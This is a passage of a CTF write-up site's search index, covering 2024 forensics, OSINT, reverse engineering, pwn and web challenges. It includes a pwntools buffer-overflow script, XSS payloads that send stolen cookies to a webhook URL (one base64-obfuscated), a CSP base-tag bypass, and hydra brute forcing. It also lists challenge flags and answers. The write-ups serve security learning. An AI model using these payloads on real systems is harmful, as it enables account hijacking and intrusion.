</p>"},{"location":"ctf/2024/gctf-2024/forensics/qna/","title":"QNA","text":""},{"location":"ctf/2024/gctf-2024/forensics/qna/#description","title":"Description","text":"<p>Challenge description hints that the flag might be the answer of the Microsoft Security questions. Challenge attachments are all the registry files which hint that this might be something related to registry.</p>"},{"location":"ctf/2024/gctf-2024/forensics/qna/#solution","title":"Solution","text":"<p>Through initial research, I found a reddit post mentioning that the answer to the security questions are stored in LSA secrets in the registry. After researching more, I decided to search for alternative solution as I think this might not be the solution as the process of decrypting is quite hard.</p> <p></p> <p>After searching for tools to get the Windows Security answer, I found this tool. Installing it and running it immediately shows us the result. </p>"},{"location":"ctf/2024/gctf-2024/forensics/stop-slacking-off/","title":"Stop Slacking Off","text":""},{"location":"ctf/2024/gctf-2024/forensics/stop-slacking-off/#description","title":"Description","text":"<p>Challenge description hints that this is something related to Slack. The challenge is quite straight forward as only Slack folder is given to the participants.</p>"},{"location":"ctf/2024/gctf-2024/forensics/stop-slacking-off/#solution","title":"Solution","text":"<p>  From this post, we know that all chats are stored in leveldb format. I did not able to find any leveldb viewer that allows me to view the file.  </p> <p>  Therefore, I tried to search for parsers online for parsing Slack artifacts and found this tool.  </p> <p> </p>"},{"location":"ctf/2024/gctf-2024/misc/devops-101/","title":"DevOps 101","text":""},{"location":"ctf/2024/gctf-2024/misc/devops-101/#description","title":"Description","text":""},{"location":"ctf/2024/gctf-2024/misc/devops-101/#solution","title":"Solution","text":"<p>  Credentials are given in the VM. It is a challenge related to GitLab. GitLab is open source and it is normally used for DevOps and DevSecOps projects.  </p> <p>  Once signed in, we can see that there is only one project. We can go through the project and explore.  </p> <p>  In commit section, we will see several comments that have weird strings. The first part of the string has an equal sign as the first character. Therefore, I suspected that it is a base64 string, but in reversed order.  </p> <p>  We can find other parts of the string in the commit.  </p> <p></p>"},{"location":"ctf/2024/gctf-2024/misc/devsecops/","title":"Dev(Sec?)Ops","text":""},{"location":"ctf/2024/gctf-2024/misc/devsecops/#description","title":"Description","text":"<p>This is the continuation of DevOps 101 challenge. I wasn't able to solve this challenge during the competition due to time limitation, so I continued solving it after the competition ends because this challenge looks unique and interesting XD.</p> <p></p> <p>These are the files we have in the VM. In order to understand more about GitLab, you can watch some quick tutorials.</p>"},{"location":"ctf/2024/gctf-2024/misc/devsecops/#solution","title":"Solution","text":"<p><code>.gitlab-ci.yml</code> is used to define our project stages and jobs. <code>include</code> specifies those files to be included. This means that the 3 yml files in <code>jobs</code> folder are also included for this project.  </p> <p>From DevOps 101 challenge, you can see that there is a variable named <code>$FLAG</code>. I thought that it would be the flag and I tried it.</p> <p>Steps:</p> <ol> <li><code>nano build.yml</code> - add <code>- echo \"$FLAG\"</code></li> <li><code>git add</code>, <code>git commit</code>, and <code>git push</code></li> <li>View job log</li> </ol> <p> </p> <p>  Apparently the <code>$FLAG</code> variable does not contain the flag :p   Looking back to the commit, we can see that there might be another variable named <code>REAL_FLAG</code>.</p> <p>  So I tried again with <code>$REAL_FLAG</code> variable this time.  </p> <p></p> <p>Then we got the flag.</p>"},{"location":"ctf/2024/gctf-2024/misc/devsecops/#alternative-methods","title":"Alternative Methods","text":"<p>The challenge creator shared two alternative methods to solve this challenge: 1. Declare <code>$REAL_FLAG</code> in one of the yml file, then reference it to <code>variables.yml</code> file  2. Use <code>printenv</code> command to print all environment variables, and we will be able to see the <code>$REAL_FLAG</code> variable.</p>"},{"location":"ctf/2024/gctf-2024/misc/devsecops/#idea-of-the-challenge","title":"Idea of the Challenge","text":"<p>According to the challenge creator, the idea of this challenge is about the misconfigurations of the variable. Both variables are set as \"Visible\". Although <code>$REAL_FLAG</code> is not shown in the commit, it still can be called and the output can be seen in job logs. </p> <p>Challenge creator (D4RKN19HT):</p> <p>the misconfig is, if you don't mask the variable, it will be visible in job logs if you echo it</p> <p>  The screenshot above shows the <code>$REAL_FLAG</code> variable in admin user's view.</p>"},{"location":"ctf/2024/gctf-2024/misc/find-me-1/","title":"Find Me 1","text":""},{"location":"ctf/2024/gctf-2024/misc/find-me-1/#description","title":"Description","text":""},{"location":"ctf/2024/gctf-2024/misc/find-me-1/#solution","title":"Solution","text":"<p>Since the challenge description mentioned fingerprint, we can try to see if there is any useful information from the metadata of the image. Using <code>exiftool</code>, we can get the hacker's username <code>ShadeRaider96</code>.</p> <p></p> <p>We can use the username and search through popular social media. We will then find his real name in X, along with his GitHub profile (for Find Me 2).</p>"},{"location":"ctf/2024/gctf-2024/misc/find-me-2/","title":"Find Me 2","text":""},{"location":"ctf/2024/gctf-2024/misc/find-me-2/#description","title":"Description","text":"<p>Challenge description gives a hint that we need to make contact with him, which means we might need to message him or send an email to him. It also mentions that he dislikes replying through socials, hence email might be the way.</p>"},{"location":"ctf/2024/gctf-2024/misc/find-me-2/#solution","title":"Solution","text":"<p>  In his GitHub profile, we can get his LinkedIn and several GitHub repositories.  </p> <p>  His LinkedIn profile gives us a hint to email him, showing that we are on the right path. Since we can't find his email from his LinkedIn, we can try to search through his GitHub repositories. </p> <p> </p> <p><code>MyInfo</code> repo looks most interesting for me as it might contain his information like email. Looking through the commit, we can see the latest commit deleted a portion of code, which is the flag.    </p> <p></p> <p>Just copy and run the Python script and it will print out the hacker's email.  </p> <p>  Send an email to this guy and we will get an immediate automatic reply, with the flag.</p>"},{"location":"ctf/2024/gctf-2024/misc/i-forgot/","title":"I Forgot","text":""},{"location":"ctf/2024/gctf-2024/misc/i-forgot/#description","title":"Description","text":"<p>The challenge gives us an audio file. According to the challenge description, it mentions plagiarism, lawsuit, 5 million, and courthouse. Our task is to get the name of the courthouse.</p>"},{"location":"ctf/2024/gctf-2024/misc/i-forgot/#solution","title":"Solution","text":"<p>We can use our mobile phone or any online applications to recognize the music, which is \"Blurred Lines\".</p> <p></p> <p>We will then find this news that has most of the content stated in the challenge description.</p> <p></p> <p>After reading through the news, we will the judge that give the final verdict is Judge Jacqueline Nguyen.</p> <p></p> <p>Through her Wikipedia page, we can get the court that she serves for, which will be the flag.   </p>"},{"location":"ctf/2024/gctf-2024/pwn/ret2win/","title":"Ret2Win I","text":""},{"location":"ctf/2024/gctf-2024/pwn/ret2win/#description","title":"Description","text":"<p>This challenge is solved by my teammate, <code>Jin_707</code>. This writeup is written by <code>Jin_707</code>.</p>"},{"location":"ctf/2024/gctf-2024/pwn/ret2win/#solution","title":"Solution","text":"<p>From the challenge title we can see it is a classic Ret2Win challenge. Source code was given too so we can see that there is a buffer of 64 bytes and the vulnerable function gets. <code>gets()</code> function is famous because it accepts user input without upper bound, which often leads to bof. So, this challenge is to overflow the buffers and supply it with the win address that prints out the flag. Reference: https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win</p> <p></p> <p>Get <code>win</code> address with <code>objdump -d | grep win</code>.</p> <p></p> <p>Script with <code>pwntools</code>: <pre><code>from pwn import *\n\n# Set up the context for the binary\nbinary_path = './chall'\ncontext.binary = binary_path\n\n# Connect to the remote server\np = remote('3.1.25.253', 9991)\n\n# Find the address of the win function\nwin_addr = p64(0x00000000004011f6)  # Use p64 for 64-bit address\n\n# Create the payload\n# The buffer size is 64 bytes, and the saved RBP is 8 bytes. Hence, we need 72 bytes before we overwrite the return address.\npayload = b'A' * 72 + win_addr  # 64 bytes buffer + 8 bytes for saved RBP\n\n# Send the payload\np.sendline(payload)\n\n# Interact with the remote shell\np.interactive()\n</code></pre></p>"},{"location":"ctf/2024/gctf-2024/re/gopher-chan/","title":"Gopher-chan","text":""},{"location":"ctf/2024/gctf-2024/re/gopher-chan/#description","title":"Description","text":"<p>This challenge is solved by my teammate, <code>Jin_707</code>. This writeup is written by <code>Jin_707</code>.</p>"},{"location":"ctf/2024/gctf-2024/re/gopher-chan/#solution","title":"Solution","text":"<p> Just put into decompiler and <code>Ctrl + F</code> to find the flag format gctf and we got the flag weee  Think can use strings <code>&lt;filename&gt; | grep \u201cgctf\u201d</code> to find it too. There is also a useful online compiler introduced by my friend Firdaus: https://dogbolt.org/</p>"},{"location":"ctf/2024/gctf-2024/re/phone-siapa-ni/","title":"Phone Siapa Ni?","text":""},{"location":"ctf/2024/gctf-2024/re/phone-siapa-ni/#description","title":"Description","text":"<p>The attachment given is a zip file containing all the files and folders as shown above.</p>"},{"location":"ctf/2024/gctf-2024/re/phone-siapa-ni/#solution","title":"Solution","text":"<p>  The goal of this challenge is to find the name of the owner. I started with looking through <code>AndroidManifest.xml</code> as it normally contains basic information of the app (feel free to correct me cuz I am not too familiar with Android reverse engineering XD). However, the file appears abnormal to me as it is not in readable text.   After going through some research, I found out that it is a binary XML file, and we can use parser to parse it into readable format. However, the content doesn't look useful for me.   After some researching, I found out that <code>classes.dex</code> files might be useful as it contains the classes files. We can get the source code of the application from it.   Using Kali Linux tool <code>d2j-dex2jar</code>, we can convert dex files into jar files so that it is readable. From <code>classes3.dex</code>, we will be able to find the main source code of the app. We can see that there is a Google Drive link which contains a name list. Looking through the source code, we can see that it is comparing user input to a SHA256 hash.   So, we can create a script to generate hashes for the names in the name list, and compare with the hash from the source code to get the name.</p> <pre><code>import hashlib\n\n# Given SHA-256 hash\ntarget_hash = \"d455bf6375fd293e2091970986002934e6cc7d0c59f2cf8feb80a0c09adfa784\"\n\n# Function to hash a name using SHA-256\ndef hash_name(name):\n    return hashlib.sha256(name.encode('utf-8')).hexdigest()\n\n# Open and read the file containing the list of names\nwith open(\"senaraiPelajarUITM.txt\", \"r\") as file:\n    names = file.readlines()\n\n# Loop through the names, hash each one, and check if it matches the target hash\nfor name in names:\n    name = name.strip()  # Remove any leading/trailing whitespace or newline characters\n    hashed_name = hash_name(name)\n\n    if hashed_name == target_hash:\n        print(f\"Match found: {name}\")\n        break\nelse:\n    print(\"No match found.\")\n</code></pre>"},{"location":"ctf/2024/gctf-2024/web/rainbow-i/","title":"Rainbow I","text":""},{"location":"ctf/2024/gctf-2024/web/rainbow-i/#description","title":"Description","text":"<p>This challenge is solved by my teammate, <code>Jin_707</code>. This writeup is written by <code>Jin_707</code>.</p>"},{"location":"ctf/2024/gctf-2024/web/rainbow-i/#solution","title":"Solution","text":"<p>From the challenge description, we can see this should be an XSS challenge, and the link also leads us to a YouTube video introducing XSS. Since source code is provided, so we move on to check the source code first (important to understand how the website works and where you should inject the payload!)</p> <p></p> <p>At first, we can see that the filters implemented are quite strong which checks for all caps and  will replace it. </p> <p></p> <p>However, there are still some tags that are not being filtered like <code>&lt;svg onload=alert(1)&gt;</code> When doing the writeup i also found that this works <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code> because the sanitization is done by using replace, so the system will read through our payload and replace only <code>&lt;script&gt;</code> into empty making the payload to become <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p> <p></p> <p>Don\u2019t forget to check until the end of the source code, we can see that the <code>bot.js</code> will be visiting the endpoint <code>/report</code>, which is where we should inject our payload on.   Since XSS is being triggered, we can just use the working payload and get the cookies as usual. <code>iFrame</code> is used to create a small webpage inside the web app, then supply with the unique URL from https://webhook.site/.  </p> <p>Payload: <pre><code>&lt;svg/onload=document.write(\"&lt;iframe src='https://webhook.site/ccffcd19-da9c-4b78-a725-7377e2cab03b?cookie=\"+document.cookie+\"'&gt;&lt;/iframe&gt;\");&gt;\n</code></pre></p> <p>But just to avoid any hiccups and out of my own habits, I turn the context into base64 encoded strings and decode it back with <code>eval</code> + <code>atob</code>. Final payload:  <pre><code>&lt;svg/onload=\neval(atob(\"ZG9jdW1lbnQud3JpdGUoIjxpZnJhbWUgc3JjPSdodHRwczovL3dlYmhvb2suc2l0ZS9jY2ZmY2QxOS1kYTljLTRiNzgtYTcyNS03Mzc3ZTJjYWIwM2I/Y29va2llPSIrZG9jdW1lbnQuY29va2llKyInPjwvaWZyYW1lPiIpOw==\"))&gt;\n</code></pre></p> <p></p>"},{"location":"ctf/2024/gctf-2024/web/rainbow-ii/","title":"Rainbow II","text":""},{"location":"ctf/2024/gctf-2024/web/rainbow-ii/#description","title":"Description","text":"<p>This challenge is solved by my teammate, <code>Jin_707</code>. This writeup is written by <code>Jin_707</code>.</p>"},{"location":"ctf/2024/gctf-2024/web/rainbow-ii/#solution","title":"Solution","text":"<p>The biggest difference of rainbow1 and rainbow2 is basically just this line:</p> <p> </p> <p>From the code above basically it checks all types of content and only allows content from the same origin as the website itself or its subdomains to be loaded. It also permits scripts from same origin or inline scripts with the specific nonce (a1b2c3d4e5f6g7h8) are allowed to execute.</p> <p></p> <p>Other details can refer to https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy. So obviously the previous payload using <code>&lt;svg&gt;</code> won\u2019t work.</p> <p></p> <p>Hint released shows that we can utilize <code>&lt;base&gt;</code> tag which is a complete new thing for me. Found a payload at https://www.cobalt.io/blog/csp-and-bypasses <code>&lt;Base Href=//X55.is&gt;</code> that proves that <code>&lt;base&gt;</code> works. Also found a good tool that helps to evaluate the strength and weaknesses of CSP https://csp-evaluator.withgoogle.com/  and it hints us that base-uri and object-src are missing from the CSP. Means can do base-uri injection,  found a very decent writeup on solving this kind of challenge.  So, basically i just host a python server with my js script in the directory (self created) of <code>/static/rainbowifyText.js</code> because the HTML document is loading an external JavaScript file called <code>rainbowifyText.js</code> from the <code>/static/</code> directory on the server. Payload on server:  <pre><code>window.location=\"https://webhook.site/ccffcd19-da9c-4b78-a725-7377e2cab03b/\"+btoa(document.cookie);\n</code></pre></p> <p></p> <p>Then I threw the same port I hosted with python to ngrok to make it public (at first i was running on http, but apparently it had some issues, so I hosted it with ngrok tcp 3000, copy the forwarding address and paste in into the href part of our payload) Then send the payload below in the web app: <pre><code>&lt;base href=\"tcp://0.tcp.ap.ngrok.io:122606\"&gt;&lt;/base&gt;\n</code></pre></p> <p></p> <p>At first I sent it on the main index page to check if it works, then saw the request was coming into webhook, so just proceed to <code>/report</code> endpoint to send the payload. Flag was appended at the end of the URL encoded as base64 because according to the payload sent from my server. </p> <p></p> <p>So just move to cyber chef decode and here we got the flag! </p>"},{"location":"ctf/2024/ihack-2024/about/","title":"[ About ]","text":"<ul> <li>CTF Name: Siber Siaga X iHack CTF 2024</li> <li>Organizer: Siber Siaga &amp; UITM</li> <li>Description: CTF writeup for qualification round.</li> </ul> Category Challenge Name DFIR Covert DFIR Memory DFIR Mystery File"},{"location":"ctf/2024/ihack-2024/covert/","title":"Covert","text":""},{"location":"ctf/2024/ihack-2024/covert/#description","title":"Description","text":"<p>Our team suspected that the server has been compromised based on the network packets. We observed unusual network traffic indicating potential data infiltration and exfiltration. Could you confirm whether any information has been exfiltrated?</p> <p>Attachment: <code>covert.pcap</code></p>"},{"location":"ctf/2024/ihack-2024/covert/#solution","title":"Solution","text":"<p>Looking through the protocol hierarchy, nothing really catches our eye from the first glance. We proceed to analyze some common protocols such as TCP and HTTP but found nothing interesting.</p> <p></p> <p>We then notice that there are some interesting output in the data section of ICMP traffic. Since the description mentions data exfiltration, we think that this might be performed through ICMP data.</p> <p><pre><code>tshark -r covert.pcap -Y \"icmp\" -T fields -e data.data | uniq &gt; icmp-data.txt\n</code></pre> Therefore, we use tshark to output all the encoded icmp data and output to a text file, and try to convert it from hexadecimal to ASCII.</p> <p></p> <p>From the decoded output, we are able to get some information:</p> <pre><code>- stager.sh.enc - stager script [https://gist.githubusercontent.com/faisalfs10x/beb8337ae1466c28a574cbaca2278e8d/raw]\n- crypter.sh (404 not found) [https://gist.githubusercontent.com/faisalfs10x/e914e78f0ad021701cef0baab03bd9e2/raw/f61fc74ebc567af98f2734ff07dda8b1f968ec31/crypter.sh]\n- key for encryption and decryption process (404 not found) [https://gist.githubusercontent.com/faisalfs10x/ed9e939df0686713aca40f54c8744d51/raw]\n- fsysteminfo.txt - data that is being exfiltrated\n- fsysteminfo.txt.enc - data that is being exfiltrated but encrypted [https://gist.github.com/faisalfs10x/a6d5180d28ddb4db8a708f442d589a3c]\n</code></pre> <p>We also know that some of the files are being deleted from the system and it is no longer accessible. Therefore, using all the information given, we know that we need to decrypt the exfiltrated data (fsysteminfo.txt.enc) using the key in order to get the flag.</p> <p></p> <p>When we browsed through the link <code>crypter.sh</code>, we tried to go one directory before to see if there is any possibility to get the file but failed. Therefore, we \u201cassumed\u201d/\u201cremembered wrongly\u201d that we did the same to the link of the key. So, we stuck there for the entire day ;D</p> <p></p> <p>After confirming with the challenge creator, we reattempt the challenge as we are quite sure that we are on the right path. Trying the same method again on the link to the key (which is to visit the main path - remove <code>/raw</code> from the URL), we finally get the key that we need.</p> <p></p> <p>We then proceed to decrypt the file. But it failed! The clock is ticking!!!!!! We panic!!!!!! WHY!!!!!!!!!!</p> <p>After asking our best friend ChatGPT which gave us the correct command (note that the encrypted file has to be base64 decoded first before decrypting it with the key):</p> <pre><code>openssl enc -d -aes-256-cbc -in fsysteminfo-b64d.enc -out decrypted_file -pass file:secret.key\n</code></pre> <p></p> <p>Felt super relieved when we saw the word \"iHACK 2024\" (cuz we are on the right path...)</p> <p></p> <p>Just scroll and look through the file to find the flag or you could also use <code>grep</code> command to search for the flag format. </p>"},{"location":"ctf/2024/ihack-2024/covert/#flag","title":"Flag","text":"<p><code>ihack24{ICMP_for_C2_channel}</code></p>"},{"location":"ctf/2024/ihack-2024/memory/","title":"Memory","text":""},{"location":"ctf/2024/ihack-2024/memory/#description","title":"Description","text":"<p>The Digital Forensics and Incident Response (DFIR) team confirmed that the CEO's PC has been compromised due to abnormal behaviour detected on the workstation. They also noted suspicious user creation activity related to this incident.  As an analyst, you have been provided with the memory dump file from the CEO's workstation to perform a memory forensic analysis. </p> <p>Attachment: <code>Windows.vmem</code></p>"},{"location":"ctf/2024/ihack-2024/memory/#solution","title":"Solution","text":"<p><pre><code>vol3 -f Windows.vmem windows.cmdline.CmdLine &gt; cmdline.txt\n</code></pre> The given file has the name \u201cWindows.vmem\u201d, which gives us a hint that this is a Windows memory dump. Knowing that user creation activity by the attacker is mostly done using the command line, we immediately run Volatility 3 with the plugin for dumping the command line. Note that we also redirects the output to a text file named <code>cmdline.txt</code> so that we can refer later. </p> <p>  Looking through the result, we saw an encoded command ran with powershell which might be malicious. </p> <p>  After decoding it in PowerShell, we can see that it is a little obfuscated, hence we are still unable to understand what is going on there. But the obfuscated code kind of gave us another assurance that this is the malicious code we are looking for. </p> <p>  To save time, just run the code in tio.run. Replace Invoke-Expression to Write-Host to print the obfuscated code instead of executing it. From the output we can see the command <code>net user sysadmin SYSAdmin /add</code> which is trying to add a user named <code>sysadmin</code> with the password of <code>SYSAdmin</code>. </p>"},{"location":"ctf/2024/ihack-2024/memory/#flag","title":"Flag","text":"<p><code>ihack24{sysadmin_SYSAdmin}</code></p>"},{"location":"ctf/2024/ihack-2024/mystery-file/","title":"Mystery File","text":""},{"location":"ctf/2024/ihack-2024/mystery-file/#description","title":"Description","text":"<p>A company has engaged your team to conduct a Digital Forensics and Incident Response (DFIR) analysis on their compromised image servers. During the investigation, your team discovered a suspicious file named \"program.bin\" in an unconventional binary. The nature of this file, including its content and unusual placement, strongly suggests that it could be a malicious payload or a backdoor script. The team is tasked with analyzing this file to determine its purpose and potential threat. </p> <p>Attachment: <code>mystery file.zip</code></p>"},{"location":"ctf/2024/ihack-2024/mystery-file/#solution","title":"Solution","text":"<p>By using <code>file</code> command to see the file type, we know that it is a zip file. After unzipping it, it gives us <code>config.dat</code> which seems like a file with plaintext. </p> <p></p> <p>Looking into the file, it seems like it is heavily obfuscated. However, instead of the .dat file, it looks more like a bash script as it contains <code>eval</code>.</p> <p>Tip</p> <p><code>eval</code> in Bash programming language is mostly used to execute command.  </p> <p>Therefore, we proceed to search for tools that can perform bash script deobfuscation. Here are the tools that can be used:  - tio.run  - DeBash  - Bash Frustrator</p> <p> </p> <p>We used Bash Frustrator which is a Python tool to deobfuscate the script.</p> <p> </p> <p>After the first deobfuscation process, the script seems like no change and still has long unreadable strings. However, we noticed that <code>eval</code> became <code>echo</code>, and the script is actually shorter compared to the previous script. Therefore, we think that the script might have several layer of obfuscation. </p> <p></p> <p>After several times of deobfuscation, we can finally read and understand the script. There is a function which has encoded command. </p> <p></p> <p>Decode the command and we will get the content. We need to visit the URL to get the flag.  </p> <p> </p>"},{"location":"ctf/2024/ihack-2024/mystery-file/#flag","title":"Flag","text":"<p><code>ihack24{0bfusc4t3d_thr34t3}</code></p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/","title":"Enumeration and Escalation","text":"<p>A basic B2R machine for beginners.</p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#task-1","title":"Task 1","text":""},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#description","title":"Description","text":"<p>We found an IP address associated with Flaming Donkey. Scan the IP to see what service they are implementing. What are the open ports?  </p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#solution","title":"Solution","text":"<pre><code>nmap -p- -A -T4 10.75.102.188 \n</code></pre> <p><code>-A</code> is the combination of <code>-O</code>, <code>-sC</code> and <code>-sV</code>. By running this simple command, we can scan all the open ports on this IP address.   Answer: <code>21,22,5000</code></p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#task-2","title":"Task 2","text":""},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#description_1","title":"Description","text":"<p>Check out the ports found in your nmap scan. Which services take a username and password? Which port contains a website you can enumerate? Inspect the website, what can you find? What is the username's password?  </p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#solution_1","title":"Solution","text":"<p>  Port <code>5000</code> is running a website. By viewing the source code we will be able to see the comment stating that the password of the user <code>carl</code> is in <code>/ftppasswords</code>.  </p> <p>  Browsing to <code>/ftppasswords</code> shows a list of passwords. We can download the list for later using the command below: <pre><code>wget http://10.75.102.188/ftppasswords\n</code></pre></p> <p>  We can then use <code>hydra</code> and provide username <code>carl</code> using <code>-l</code> and brute force the password using <code>-P</code> by providing the password list.  <pre><code>hydra -l carl -P ftppasswords ftp://10.75.102.188\n</code></pre> This command will connect to FTP service as user <code>carl</code> and brute force the passwords in <code>ftppasswords</code> to find the correct password.   Answer: <code>carlisdabomb</code></p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#task-3","title":"Task 3","text":""},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#description_2","title":"Description","text":"<p>Now that we have a username and password, log into the ftp server. Look around, be nosy, read the messages. What is the name of the directory where the login page is found?</p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#solution_2","title":"Solution","text":"<p>  Use <code>ls</code> to list the files and directories in the FTP server and we can see that there are 3 text files in it. We can then use <code>get &lt;file&gt;</code> to download each of the file to our attacker machine.</p> <p>  From those files, we know that user <code>carl</code> reuses his password somewhere. Other than that, we also get a list of hidden directories which one of them might be the login page. Therefore, we need to brute force the directory in order to get the correct directory name.   We can use <code>dirb</code> by providing the wordlist <code>hiddenDirectories.txt</code> to brute force the directory. Scanning result with status code 200 shows the correct directory of the website has been found.   Answer: <code>9z5hjiUuMobNIwbh0CS2</code></p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#task-4","title":"Task 4","text":""},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#description_3","title":"Description","text":"<p>What is the password for Randy?</p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#solution_3","title":"Solution","text":"<p>From Task 3, once we get the correct directory name, we can then login as carl, which will redirect us to the page below.   From this page we know that user <code>randy</code> has a password which is also taken from the password list. However the password is hashed into MD5 format. Therefore, we can create a script to convert the password list <code>ftppasswords</code> into MD5 hash, and compare with Randy's password to find the correct password.  <pre><code>import hashlib\n\n# Your provided MD5 hash\ntarget_hash = \"07b832e822ffe44d9c0eb4acda78388a\"\n\ndef hash_passwords(file_path):\n    with open(file_path, 'r') as file:\n        for line in file:\n            # Remove newline and whitespace\n            password = line.strip()\n            # Convert the password to an MD5 hash\n            hashed_password = hashlib.md5(password.encode()).hexdigest()\n            # Compare the hash to the target hash\n            if hashed_password == target_hash:\n                print(password)\n                return  # Exit after finding the first match\n\nhash_passwords('ftppasswords')\n</code></pre> With the help of ChatGPT, I've created a simple python script to do this. By running the python script, we can get the correct password in plaintext.   Answer: <code>straightcashhomie84</code></p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#task-5","title":"Task 5","text":""},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#description_4","title":"Description","text":"<p>What is the number found in <code>decrypt.txt</code>?</p>"},{"location":"ctf/2024/wicked-6/haiku/enumeration-and-escalation/#solution_4","title":"Solution","text":"<p>Once we get the password for user <code>randy</code>, we can use the credentials to connect to SSH using the command below and provide the password after the prompt: <pre><code>ssh randy@10.75.102.188\n</code></pre></p> <p>  Then we can do basic privilege escalation by running the command <code>sudo -l</code> to see the sudo privileges of Randy.</p> <p>  Therefore, we can visit GTFOBinsto get the command to be used to generate a root shell.   Lastly, we can use <code>find</code> command to search recursively from root <code>/</code> directory to find a file named <code>decrypt.txt</code>.  </p> <p>\ud83d\udca1 <code>2&gt;/dev/null</code> is used to disregard any error messages so that those error messages will not flood our screen which might make it harder to find the successful result.  </p> <p>Answer: <code>292416966271042510263</code></p>"},{"location":"ctf/2024/wicked-6/htb/about/","title":"[ About ]","text":"<ul> <li>CTF Name: Wicked6 2024 - HackTheBox CTF</li> <li>Organizer: Wicked6</li> </ul> Category Challenge Name Forensics Cash Me Ousside Reverse Engineering Almanac Reverse Engineering Number Cruncher"},{"location":"ctf/2024/wicked-6/htb/almanac/","title":"Almanac","text":"<p>Simple RE challenge</p>"},{"location":"ctf/2024/wicked-6/htb/almanac/#description","title":"Description","text":"<p>You've managed to steal Biff's secret sports channel almanac! Could he have hidden a flag somewhere inside?   Attachment: <code>almanac</code></p>"},{"location":"ctf/2024/wicked-6/htb/almanac/#solution","title":"Solution","text":"<p>  By using <code>file</code> command to see the file type, we know that it is an 64 bit ELF file.  </p> <p><pre><code>strings almanac | grep -i htb\n</code></pre> As my first step of solving simple reverse engineering challenges, I will use <code>strings</code> command to see if we can get any information or even flag. For this challenge, we can easily get the flag using this command. </p>"},{"location":"ctf/2024/wicked-6/htb/almanac/#flag","title":"Flag","text":"<p><code>HTB{7h15_b00k_t3ll5_th3_futur3!}</code></p>"},{"location":"ctf/2024/wicked-6/htb/cash-me-ousside/","title":"Cash Me Ousside","text":"<p>PowerShell script deobfuscation</p>"},{"location":"ctf/2024/wicked-6/htb/cash-me-ousside/#description","title":"Description","text":"<p>A public-facing web server was compromised and files were lost. Can you help us to understand the situation?</p> <p>Attachment: <code>capture.pcapng</code></p>"},{"location":"ctf/2024/wicked-6/htb/cash-me-ousside/#solution","title":"Solution","text":"<p> From <code>Protocol Hierarchy</code> that we can get from the <code>Statistics</code> tab in Wireshark, the protocols involved in this packet is HTTP only. We can try to filter for <code>Line-based text data</code> to see if there is any useful information.</p> <p> From the filtered output, we will see that most of the result shows 404 Not Found. By scrolling to the bottom, we can see that there are some 200 OK output showing the successful request and response to the client. Therefore, we can view the stream of the result by right clicking, and choose <code>Follow</code> --&gt; <code>TCP Stream</code>.</p> <p> We can see that the attacker uploaded a PHP webshell named <code>webshell.php</code>. From here we know that:  - IP address of attacker: <code>192.168.0.108</code> - IP address of victim: <code>192.168.0.109</code></p> <p> It can be seen that the attacker has gained initial access through the uploaded webshell. The attacker ran <code>whoami</code> as first command to see the current role.</p> <p> By scrolling to the bottom of this stream, we can see that the attacker ran a command to download a file from <code>http://192.168.0.109:80/connect</code> to the server (victim).</p> <p> To search for this request, we can go to <code>File</code> --&gt; <code>Export</code> --&gt; <code>HTTP</code> to see the packet and follow TCP stream to see the packets in a stream.</p> <p> We can see that it is a PowerShell script that is trying to remotely connecting to the victim machine and send commands.</p> <p> Analyzing the stream further, we can see that the attacker is trying to download and execute a file named <code>update.txt</code>. After the execution, there is a file named <code>test</code> which consist of a suspicious string.</p> <p> Using the same method, we can see the contents of the file without downloading it. The payload is obfuscated, so we need to deobfuscate it to know its exact content.</p> <p> After deobfuscating it, we can see that it is trying to encrypt a file named <code>Credentials.xlsx</code>.</p> <p>Process of encrypting the file</p> <ol> <li>XOR <code>Credentials.xlsx</code> with a key (value of <code>whoami</code> command)</li> <li>Base64 encode the encrypted file</li> <li>Output the file and name it as <code>test</code></li> <li>Remove the original <code>Credentials.xlsx</code></li> </ol> <p></p> <p>Therefore, we can create a python script to decrypt the file and output to the correct format which is <code>.xlsx</code>. Opening the file will give us the flag.</p>"},{"location":"ctf/2024/wicked-6/htb/cash-me-ousside/#flag","title":"Flag","text":"<p><code>HTB{c@ugh7_th3_bAd_guY!}</code></p>"},{"location":"ctf/2024/wicked-6/htb/number-cruncher/","title":"Number Cruncher","text":"<p>Simple XOR RE challenge</p>"},{"location":"ctf/2024/wicked-6/htb/number-cruncher/#description","title":"Description","text":"<p>Our brand new number-crunching program makes data impossible to retrieve! To prove it, try and decode this crunched up flag!</p> <p>Attachment: <code>cruncher</code>, <code>flag.crunched</code></p>"},{"location":"ctf/2024/wicked-6/htb/number-cruncher/#solution","title":"Solution","text":"<p>From the description, we know that the flag has been encrypted and has been outputted to <code>flag.crunched</code>.</p> <p></p> <p>By looking at the encoded flag, we can see that it is in hex format.</p> <p></p> <p>By using Ghidra, we can take a closer look into one of the functions named <code>crunch</code> which seems to be the function that encrypts the flag. From the function, we can see that the input is being xored <code>^</code> by the hex key <code>b3</code>.</p> <p></p> <p>Therefore, we can go to CyberChef to decode and decrypt it to get the 